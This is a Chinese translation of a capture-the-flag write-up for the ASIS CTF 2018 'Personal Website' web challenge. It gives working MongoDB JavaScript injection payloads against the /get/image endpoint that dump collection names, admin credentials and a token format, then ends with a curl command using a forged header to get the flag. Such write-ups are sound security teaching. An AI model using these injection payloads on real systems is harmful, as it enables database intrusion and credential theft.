# MongoDB 注入— ASISCTF 2018 Quals —个人网站写(WEB 任务)

> 原文：<https://infosecwriteups.com/mongodb-injection-asisctf-2018-quals-personal-website-write-up-web-task-115be1344ea2?source=collection_archive---------1----------------------->

参与者被问了以下问题。

> 描述:
> 
> 我很高兴，因为我建立了新的个人网站。很安全，不是吗？

![](img/0c5b0ba395781ba6e9f035dcf1d5f0b0.png)

在侦察阶段之后，我们到达了一些终点:

```
/admin_area
/get/image/[id]
/get/text/[id]
/get/image/[id]
```

在`/get/image/[id]`上 Fuzzing，我们发现它在引用注入后返回错误:

```
**Application-Error:** exception: SyntaxError: Unexpected token ILLEGAL
```

大约花了 2 个小时，我们到达了一个没有错误的状态，查询如下:

```
1%7D);return%7B1:1%7D%7D%2f%2f
```

导致了:

```
Couln't find "picture_path" property in returning object from database.
```

事后:

```
1%7D);return%7Bpicture_path:'Injected'%7D%7D%2f%2f
```

最后提取数据。现在一堆问题:

```
1%7D);return%7Bpicture_path:tojson(db.getCollectionNames()),something:2%7D%7D%2f%2f
1%7D);return%7Bpicture_path:tojson(db.authentication.find()[1]),something:2%7D%7D%2f%2f
1%7D);return%7Bpicture_path:tojson(db.credentials.find()[0]),something:2%7D%7D%2f%2f
```

揭示了 2 个重要数据:

```
{
	"_id" : ObjectId("5ae63ae0a86f623c83fecfb4"),
	"id" : 2,
	"method" : "header",
	"format" : "md5(se3cr3t|[username]|[password])",
	"activate" : "true"
}{
	"_id" : ObjectId("5ae63ae0a86f623c83fecfb1"),
	"id" : 1,
	"username" : "administrator",
	"password" : "H4rdP@ssw0rd?"
}
```

所以`md5('se3cr3t'|administrator|h4rdP@ssw0rd?)`需要通过 header 方法登录，但是等等，header name 是什么？`/admin_area`访问透露:

```
authorization_token not found
```

最后:

```
curl [http://206.189.54.119:5000/admin_area](http://206.189.54.119:5000/admin_area) -H "authorization_token: 2cc348195dc1ab9842f9446b41ef650b"
ASIS{3c266f6ccdaaef52eb4a9ab3abc2ca70}
```